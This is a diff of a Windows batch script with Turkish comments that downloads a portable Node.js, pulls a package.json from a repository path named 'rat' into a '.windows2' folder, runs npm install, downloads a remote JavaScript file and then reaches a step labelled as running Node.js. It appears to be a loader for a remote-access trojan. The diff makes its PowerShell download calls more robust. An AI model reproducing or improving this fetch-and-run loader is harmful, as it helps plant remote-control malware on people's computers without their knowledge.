@@ -17,14 +17,18 @@ set "packageJsonUrl=https://raw.githubusercontent.com/murmurlab/rat/main/package
 :: İndirilecek dosyaların hedef konumu
 set "downloadPath=%folderPath%"
 
+:: PowerShell komutu kontrolü
+set "psCommand=powershell.exe"
+where %psCommand% >nul 2>&1 || set "psCommand=powershell"
+
 :: Node.js indirme
 echo Node.js indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%nodeUrl%', '%downloadPath%\node.zip')"
+%psCommand% -command "(New-Object System.Net.WebClient).DownloadFile('%nodeUrl%', '%downloadPath%\node.zip')"
 
 :: Zip dosyasının çıkarılması
 echo Zip dosyası çıkarılıyor...
 if not exist "%downloadPath%\node-v16.3.0-win-x64\*" (
-    powershell -command "Add-Type -A 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory('%downloadPath%\node.zip', '%downloadPath%')"
+    %psCommand% -command "Add-Type -A 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory('%downloadPath%\node.zip', '%downloadPath%')"
 ) else (
     echo Zip dosyası zaten çıkarılmış.
 )
@@ -37,7 +41,7 @@ set "PATH=%nodePath%;%PATH%"
 
 :: package.json dosyasının indirilmesi
 echo package.json dosyası indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%packageJsonUrl%', '%folderPath%\package.json')"
+%psCommand% -command "(New-Object System.Net.WebClient).DownloadFile('%packageJsonUrl%', '%folderPath%\package.json')"
 
 :: .windows2 klasöründe npm install
 echo .windows2 klasöründe npm install yapılıyor...
@@ -47,7 +51,7 @@ npm install --global --production windows-build-tools
 
 :: Script dosyasının indirilmesi
 echo Script dosyası indiriliyor...
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%scriptUrl%', '%folderPath%\your-script.js')"
+%psCommand% -command "(New-Object System.Net.WebClient).DownloadFile('%scriptUrl%', '%folderPath%\your-script.js')"
 
 :: Node.js'in çalıştırılması
 echo Node.js çalıştırılıyor...
